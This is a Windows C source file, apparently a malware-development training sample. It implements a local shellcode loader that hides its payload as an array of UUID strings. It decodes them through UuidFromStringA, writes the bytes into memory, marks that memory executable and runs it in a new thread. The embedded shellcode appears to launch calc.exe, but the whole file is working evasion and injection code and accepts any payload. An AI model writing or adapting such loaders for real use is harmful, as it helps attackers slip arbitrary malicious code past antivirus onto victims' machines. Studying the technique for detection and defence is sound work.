#include <Windows.h>
#include <stdio.h>
#include <string.h>

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID*		Uuid
);

char* UuidArray[] = {
	"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
	"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
	"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
	"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
	"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF",
	"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C632E", "00657865-9090-9090-9090-909090909090"
};

#define NumberOfElements 18

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE		pBuffer     = NULL,
			TmpBuffer   = NULL;

	SIZE_T		sBuffSize   = NULL;

	PCSTR		Terminator  = NULL;
  
	NTSTATUS	STATUS      = NULL;

	// Get UuidFromStringA address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// Get the real size of the shellcode (number of elements * 16 => original shellcode size)
	sBuffSize = NmbrOfElements * 16;
	// Allocate mem that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// Set TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the addresses saved in Ipv6Array
	for (int i = 0; i < NmbrOfElements; i++) {
		// UuidArray[i] is a single UUid address from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			printf("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
			return FALSE;
		}

		// TmpBuffer will be used to point to where to write next (in the newly allocated memory)
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}

int main(void) {

	PBYTE		pDeobfuscatedPayload	= NULL;
	SIZE_T		sDeobfuscatedSize	= NULL;
	
	PVOID		pShellcodeAddress	= NULL;
	PDWORD		lpflOldProtect		= NULL;
	HANDLE		hThread			= NULL;

	printf("[i] Injecting shellcode to the local process of pid: %d. \n", GetCurrentProcessId());
	
	printf("[#] Press <enter> to decrypt ..");
	getchar();
	// Decrypt payload
	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		printf("[!] Deobfuscation failed.\n");
		return -1;
	}
	printf("[i] Deobfuscated payload at : 0x%p of size %ld. \n", pDeobfuscatedPayload, sDeobfuscatedSize);

	printf("[#] Press <enter> to allocate ..");
	getchar();
	// Allocate memory to store payload
	pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc failed with error : %d \n", GetLastError());
		return -1;
	}
	printf("[i] Allocated memory at : 0x%p. \n", pShellcodeAddress);

	printf("[#] Press <enter> to write payload ..");
	getchar();
	// Copy deobfuscated payload to newly allocated memory 
	memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
	// Zero deobfuscated payload
	memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);
	
	// Change memory protection of the allocated memory to be executable 
	if (VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &lpflOldProtect) == NULL) {
		printf("[!] VirtualProtect failed with error : %d. \n", GetLastError());
		return -1;
	}
	printf("[+] Complete. \n");

	printf("[#] Press <enter> to run ..");
	getchar();
	// Creates new thread that runs the payload
	hThread = CreateThread(NULL, 0, pShellcodeAddress, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread failed with error : %d. \n", GetLastError());
		return -1;
	}
	// Wait for the thread to execute
	if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED) {
		printf("[!] WaitForSingleObject failed with error : %d. \n", GetLastError());
		return -1;
	}

	// Deallocate previously allocated memory
	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	VirtualFree(pShellcodeAddress, sDeobfuscatedSize, MEM_RELEASE);
	
	printf("[#] Press <enter> to quit ..");
	getchar();

	return 0;
}
